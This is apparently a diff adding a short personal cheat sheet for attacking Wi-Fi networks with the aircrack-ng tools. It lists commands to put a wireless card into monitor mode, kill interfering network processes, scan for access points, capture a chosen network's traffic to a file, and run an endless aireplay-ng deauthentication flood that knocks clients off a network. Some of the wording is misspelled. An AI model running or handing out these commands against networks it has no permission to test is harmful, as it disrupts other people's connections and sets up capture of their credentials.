@@ -1,0 +1,30 @@
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor 
+ifconfig wlan0 up
+
+
+u might disable networkmanager to kill interept
+
+airmon-ng check wlan0
+kill "PID" of network manager
+kill dhclient
+kill rest
+
+-----------------------
+perform scan of our environment: no networkscan is activated now
+
+check whose in the network:
+--------------------
+
+airodump-ng wlan0
+
+BSSID = macaddress
+pwr = the lower, more signal
+
+-----------
+airodump-ng -c "channel" --bssid "MACaddress" -w "fine_name"
+-------------
+aireplay-ng -0 0 -a "MACaddress" //0 0 means infinite loop for authei=ntication
+
+
+
